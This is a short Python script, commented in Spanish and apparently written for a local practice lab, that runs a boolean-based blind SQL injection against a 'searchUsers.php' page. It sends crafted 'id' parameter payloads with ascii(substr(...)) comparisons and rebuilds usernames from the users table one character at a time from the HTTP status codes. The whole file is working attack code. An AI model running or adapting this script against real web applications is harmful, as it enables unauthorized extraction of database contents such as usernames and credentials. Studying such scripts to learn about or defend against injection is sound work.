#!/usr/bin/python3

import requests
import signal
import sys
import string
from pwn import *
import time

def def_handler(sig, frame):
    print("\n[!] - saliendo... \n")
    sys.exit(1)

#ctrl_c 
signal.signal(signal.SIGINT, def_handler)

# variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("fuerza bruta")
    p1.status("iniciando")

    time.sleep(2)

    p2 = log.progress("datos extraidos")

    extracted_info = ""

    for position in range(1,50):
        for character in range(33,126):
            sqli_url = main_url + "?id=8 or (select(select ascii(substr((select group_concat(username) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            
            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
